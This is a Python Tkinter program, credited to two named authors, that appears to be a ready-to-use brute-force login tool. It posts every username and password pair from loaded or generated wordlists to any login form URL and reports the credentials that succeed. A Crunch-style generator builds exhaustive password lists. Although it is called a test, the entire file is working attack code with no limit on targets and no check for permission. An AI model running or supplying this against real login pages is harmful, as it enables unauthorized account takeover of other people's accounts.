import tkinter as tk
from tkinter import filedialog, messagebox
import requests
from colorama import Fore, Style, init
import time
import threading
import itertools

# Starting Colorama
init(autoreset=True)

# Status flag (to stop the thread)
stop_flag = False

def post_data():
    global stop_flag
    stop_flag = False  # Reset stop flag
    
    # Data from users
    url = url_entry.get().strip()

    # If the user entered the URL without protocol, let's automatically add 'http://'
    if not url.startswith(('http://', 'https://')): 
        url = 'http://' + url

    success_keyword = success_keyword_entry.get()  # Get the key to success

    usernames = user_text.get("1.0", "end-1c").splitlines()  # Get usernames
    passwords = pass_text.get("1.0", "end-1c").splitlines()  # get passwords

    form_username_key = form_username_key_entry.get()  # Username form element
    form_password_key = form_password_key_entry.get()  # Password form element

    # Brute-force login test
    result_text.delete(1.0, tk.END)  # Clear previous results
    update_result(f"--- Starting Brute-force Login Test ---\n", "info")

    # We start this process to run in a separate thread
    threading.Thread(target=brute_force_login, args=(url, success_keyword, usernames, passwords, form_username_key, form_password_key)).start()

def brute_force_login(url, success_keyword, usernames, passwords, form_username_key, form_password_key):
    global stop_flag
    for username in usernames:
        if stop_flag:
            update_result(f"{Fore.YELLOW}Testing has been stopped.\n", "info")
            return
        
        for password in passwords:
            if stop_flag:
                update_result(f"{Fore.YELLOW}Testing has been stopped.\n", "info")
                return
            
            # Set form data
            data = {
                form_username_key: username,
                form_password_key: password
            }

            # Send POST request
            try:
                response = requests.post(url, data=data)
                if success_keyword in response.text:
                    # Password caught notification
                    update_result(f"{Fore.GREEN}[SUCCESSFUL] Username: {username} | Password: {password}\n", "success")
                    update_result(f"{Fore.BLUE}Response Code: {response.status_code}\n", "info")
                    update_result(f"Response from Server:\n{response.text[:500]}\n", "info")
                    
                    # Request to continue from user in message box
                    devam = messagebox.askyesno("Password Caught!", f"Correct password found!\nUsername: {username}\Password: {password}\nWould you like to continue?")
                    
                    if not devam:
                        stop_flag = True
                        update_result("The test was stopped by the user.\n", "info")
                        return
                    else:
                        update_result("In progress...\n", "info")
                    
                else:
                    update_result(f"{Fore.RED}[FAILED] Username: {username} | Password: {password}\n", "failure")
                    update_result(f"{Fore.YELLOW}Response Code: {response.status_code}\n", "info")
                    update_result(f"Response from Server:\n{response.text[:500]}\n", "info")
                    time.sleep(0.5)
            except requests.exceptions.RequestException as e:
                update_result(f"{Fore.RED}Error: {str(e)}\n", "failure")
                return

    update_result(f"{Style.BRIGHT + Fore.YELLOW}\n--- Trial completed ---\n", "info")

# A function that updates text in the GUI
def update_result(message, message_type="info"):
    if message_type == "success":
        result_text.insert(tk.END, f"{message}\n", "success")
    elif message_type == "failure":
        result_text.insert(tk.END, f"{message}\n", "failure")
    else:
        result_text.insert(tk.END, f"{message}\n", "info")

    result_text.yview(tk.END)  # Scroll the results to the bottom of the screen

def load_user_file():
    filepath = filedialog.askopenfilename(title="Select Username File", filetypes=(("Text files", "*.txt"),))
    if filepath:
        with open(filepath, "r") as file:
            user_text.delete(1.0, tk.END)  # Delete previous text
            user_text.insert(tk.END, file.read())

def load_pass_file():
    filepath = filedialog.askopenfilename(title="Select Password File", filetypes=(("Text files", "*.txt"),))
    if filepath:
        with open(filepath, "r") as file:
            pass_text.delete(1.0, tk.END)  # Delete previous text
            pass_text.insert(tk.END, file.read())

def stop_test():
    global stop_flag
    stop_flag = True  # Stop the test by setting the stop flag to True

# Generate password using Crunch-like logic
def generate_password_using_crunch():
    crunch_window = tk.Toplevel(root)
    crunch_window.title("Generate Password Using Crunch")
    crunch_window.geometry("400x300")

    # Add the necessary fields for Crunch parameters
    tk.Label(crunch_window, text="Crunch Min Length:", font=('Arial', 12)).grid(row=0, column=0, padx=10, pady=5)
    crunch_min_length_entry = tk.Entry(crunch_window, width=20, font=('Arial', 12))
    crunch_min_length_entry.grid(row=0, column=1, padx=10, pady=5)

    tk.Label(crunch_window, text="Crunch Max Length:", font=('Arial', 12)).grid(row=1, column=0, padx=10, pady=5)
    crunch_max_length_entry = tk.Entry(crunch_window, width=20, font=('Arial', 12))
    crunch_max_length_entry.grid(row=1, column=1, padx=10, pady=5)

    tk.Label(crunch_window, text="Crunch Charset:", font=('Arial', 12)).grid(row=2, column=0, padx=10, pady=5)
    crunch_charset_entry = tk.Entry(crunch_window, width=20, font=('Arial', 12))
    crunch_charset_entry.grid(row=2, column=1, padx=10, pady=5)

    def create_passwords():
        min_length = int(crunch_min_length_entry.get())
        max_length = int(crunch_max_length_entry.get())
        charset = crunch_charset_entry.get()

        # Generate passwords in the specified length range
        generated_passwords = []
        for length in range(min_length, max_length + 1):
            for password_tuple in itertools.product(charset, repeat=length):
                generated_passwords.append("".join(password_tuple))

        # After password generation, load the generated passwords into the text box
        pass_text.delete(1.0, tk.END)  # Clear the previous list of passwords
        for password in generated_passwords:
            pass_text.insert(tk.END, password + "\n")

        messagebox.showinfo("Success", "Passwords generated successfully!")
        crunch_window.destroy()

    # Button to start password generation
    tk.Button(crunch_window, text="Generate", font=('Arial', 12), command=create_passwords, bg='#4CAF50', fg='white').grid(row=3, column=0, columnspan=2, pady=10)

def _on_mousewheel(event):
    main_canvas.yview_scroll(int(-1*(event.delta/120)), "units")

root = tk.Tk()
root.title("Brute-force Login Test")

# Ana canvas ve scrollbar oluşturma
main_canvas = tk.Canvas(root)
scrollbar = tk.Scrollbar(root, orient="vertical", command=main_canvas.yview)
scrollable_frame = tk.Frame(main_canvas)

# Frame'in boyutu değiştiğinde scrollbar'ı güncelle
scrollable_frame.bind(
    "<Configure>",
    lambda e: main_canvas.configure(
        scrollregion=main_canvas.bbox("all")
    )
)

# Canvas'a frame'i yerleştir
main_canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
main_canvas.configure(yscrollcommand=scrollbar.set)

# Scrollbar ve canvas'ı yerleştir
scrollbar.pack(side="right", fill="y")
main_canvas.pack(side="left", fill="both", expand=True)

# Mouse wheel desteği ekle
main_canvas.bind_all("<MouseWheel>", _on_mousewheel)

# Pencere boyutu
root.geometry("750x800")
tk.Label(scrollable_frame, text="", font=('Arial', 14)).grid(row=9, column=0, padx=10, pady=5)
tk.Label(scrollable_frame, text="", font=('Arial', 14)).grid(row=9, column=0, padx=10, pady=5)
tk.Label(scrollable_frame, text="", font=('Arial', 14)).grid(row=9, column=0, padx=10, pady=5)
tk.Label(scrollable_frame, text="© Mehmet DOĞAN & Bilal ŞENOL", font=('Arial', 20, 'bold'), fg='#2C3E50').grid(row=0, column=0, columnspan=2, pady=10)

# URL Entry
tk.Label(scrollable_frame, text="Login URL:", font=('Arial', 12)).grid(row=1, column=0, padx=10, pady=5)
url_entry = tk.Entry(scrollable_frame, width=50, font=('Arial', 12))
url_entry.grid(row=1, column=1, padx=10, pady=5)

# Success Key Login
tk.Label(scrollable_frame, text="Success keyword:", font=('Arial', 12)).grid(row=2, column=0, padx=10, pady=5)
success_keyword_entry = tk.Entry(scrollable_frame, width=50, font=('Arial', 12))
success_keyword_entry.grid(row=2, column=1, padx=10, pady=5)

# Username Form Key Entry
tk.Label(scrollable_frame, text="Username Form Variable:", font=('Arial', 12)).grid(row=3, column=0, padx=10, pady=5)
form_username_key_entry = tk.Entry(scrollable_frame, width=50, font=('Arial', 12))
form_username_key_entry.grid(row=3, column=1, padx=10, pady=5)

# Password Form Key Entry
tk.Label(scrollable_frame, text="Password Form Variable:", font=('Arial', 12)).grid(row=4, column=0, padx=10, pady=5)
form_password_key_entry = tk.Entry(scrollable_frame, width=50, font=('Arial', 12))
form_password_key_entry.grid(row=4, column=1, padx=10, pady=5)

# Upload Username File
tk.Button(scrollable_frame, text="Upload Username File", font=('Arial', 12), command=load_user_file, bg='#4CAF50', fg='white').grid(row=5, column=0, padx=10, pady=10)
user_text = tk.Text(scrollable_frame, height=6, width=50, font=('Arial', 12))
user_text.grid(row=5, column=1, padx=10, pady=10)

# Upload Password File
tk.Button(scrollable_frame, text="Upload Password File", font=('Arial', 12), command=load_pass_file, bg='#FF5733', fg='white').grid(row=6, column=0, padx=10, pady=10)
pass_text = tk.Text(scrollable_frame, height=6, width=50, font=('Arial', 12))
pass_text.grid(row=6, column=1, padx=10, pady=10)

# Buttons for Posting and Stopping
tk.Button(scrollable_frame, text="Start Posting", font=('Arial', 14), command=post_data, bg='#008CBA', fg='white').grid(row=7, column=0, padx=10, pady=20)
tk.Button(scrollable_frame, text="Stop Posting", font=('Arial', 14), command=stop_test, bg='#e74c3c', fg='white').grid(row=7, column=1, padx=10, pady=20)

# Generate Password Using Crunch
tk.Button(scrollable_frame, text="Generate Password Using Crunch", font=('Arial', 14), command=generate_password_using_crunch, bg='#f39c12', fg='white').grid(row=8, column=0, padx=10, pady=20)

# Results
tk.Label(scrollable_frame, text="Results:", font=('Arial', 14)).grid(row=9, column=0, padx=10, pady=5)
result_text = tk.Text(scrollable_frame, height=12, width=80, font=('Arial', 12))
result_text.grid(row=10, column=0, columnspan=2, padx=10, pady=10)
result_text.tag_config("success", foreground="green")
result_text.tag_config("failure", foreground="red")
result_text.tag_config("info", foreground="blue")
tk.Label(scrollable_frame, text="", font=('Arial', 14)).grid(row=9, column=0, padx=10, pady=5)
tk.Label(scrollable_frame, text="", font=('Arial', 14)).grid(row=9, column=0, padx=10, pady=5)
tk.Label(scrollable_frame, text="", font=('Arial', 14)).grid(row=9, column=0, padx=10, pady=5)

root.mainloop()